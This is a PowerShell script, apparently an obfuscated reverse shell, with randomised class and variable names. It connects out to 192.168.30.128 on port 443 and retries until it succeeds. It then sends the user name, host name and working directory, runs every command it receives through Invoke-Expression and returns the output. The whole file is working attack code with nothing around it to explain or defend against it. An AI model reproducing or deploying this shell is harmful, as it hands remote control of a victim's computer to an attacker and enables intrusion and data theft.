class teLfBeEPpgKFCBB {
    
    [string]$PZfYdMvJPRjFLCDCOuJHiA = "192.168.30.128"
    [int]$LMVmhYVtCMrNKG = 443

    $zWZsVrNwAAjoAxD
    $ThmXAJELdpUr
    $sTQoVsmpbhFYyWYElaq
    $dettPtJYLdLRpmzt
    $PhuNtZymepHeiGdeGSJGVz
    $lXoyfJPK
    [int]$mGxmBygUAfKPYrwk = 50*1024

    jakkCHNCtnOPAGsvOG() {
        $this.ThmXAJELdpUr = $false
        while ($true) {
            try {
                $this.ThmXAJELdpUr = New-Object Net.Sockets.TcpClient($this.PZfYdMvJPRjFLCDCOuJHiA, $this.LMVmhYVtCMrNKG)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.qfDWOAZXejYVjJo()
    }

    qfDWOAZXejYVjJo() {
        $this.zWZsVrNwAAjoAxD = $this.ThmXAJELdpUr.GetStream()
        $this.dettPtJYLdLRpmzt = New-Object Byte[] $this.mGxmBygUAfKPYrwk
        $this.lXoyfJPK = New-Object Text.UTF8Encoding
        $this.sTQoVsmpbhFYyWYElaq = New-Object IO.StreamWriter($this.zWZsVrNwAAjoAxD, [Text.Encoding]::UTF8, $this.mGxmBygUAfKPYrwk)
        $this.PhuNtZymepHeiGdeGSJGVz = New-Object System.IO.StreamReader($this.zWZsVrNwAAjoAxD)
        $this.sTQoVsmpbhFYyWYElaq.AutoFlush = $true
    }

    OSCkX() {
        $this.jakkCHNCtnOPAGsvOG()
        $this.tDIfIcmYwwOBrP()
    }

    LCTaLIPEoiuTWVGxQsbWbMoP($OGDBbodIdNUNtgkS) {
        try {
            [byte[]]$nKhdeAqfTNv = [text.Encoding]::Ascii.GetBytes($OGDBbodIdNUNtgkS)
            $this.sTQoVsmpbhFYyWYElaq.Write($nKhdeAqfTNv, 0, $nKhdeAqfTNv.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.OSCkX()
        }
    }

    [string] qxboOPCnwoHILcuOGbExEyKi() {
        try {
            $DkPXH = $this.zWZsVrNwAAjoAxD.Read($this.dettPtJYLdLRpmzt, 0, $this.mGxmBygUAfKPYrwk)    
            $fHcwGeUsqMyaJSrAVwj = ($this.lXoyfJPK.GetString($this.dettPtJYLdLRpmzt, 0, $DkPXH))
            return $fHcwGeUsqMyaJSrAVwj
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.OSCkX()
            return ""
        }
    }

    [string] VLTOEaSBMSPLRrgTQNkolPYT($kPXxGkIquxzhK) {
        Write-Host $kPXxGkIquxzhK
        try { 
            $tKiCifa = Invoke-Expression $kPXxGkIquxzhK | Out-String
        }
        catch {
            $gQIXiEILbUL = $_.Exception
            $WWHDYtCoumXUxjisc = $_.Message
            $tKiCifa = "`n$_`n"
        }
        return $tKiCifa
    }

    [string] lFAtKJdhvukHVvyAUfnwQw() {
        $teXZRENnLMXwELCVNkp = [Environment]::UserName
        $LlXIY = [System.Net.Dns]::GetHostName()
        $SYqhEKrwsnw = Get-Location
        return "$teXZRENnLMXwELCVNkp@$LlXIY [$SYqhEKrwsnw]~$ "
    }

    tDIfIcmYwwOBrP() {
        while ($this.ThmXAJELdpUr.Connected) {
            $this.LCTaLIPEoiuTWVGxQsbWbMoP($this.lFAtKJdhvukHVvyAUfnwQw())         
            $fHcwGeUsqMyaJSrAVwj = $this.qxboOPCnwoHILcuOGbExEyKi()
            $tKiCifa = "`n"
            if ([string]::IsNullOrEmpty($fHcwGeUsqMyaJSrAVwj)) {
                continue
            }
            $tKiCifa = $this.VLTOEaSBMSPLRrgTQNkolPYT($fHcwGeUsqMyaJSrAVwj)
            $this.LCTaLIPEoiuTWVGxQsbWbMoP($tKiCifa + "`n")
            $this.zWZsVrNwAAjoAxD.Flush()
        }
        $this.ThmXAJELdpUr.Close()
        $this.OSCkX()
    } 
}

$wEmYCbUsivogL = [teLfBeEPpgKFCBB]::new()
$wEmYCbUsivogL.OSCkX()
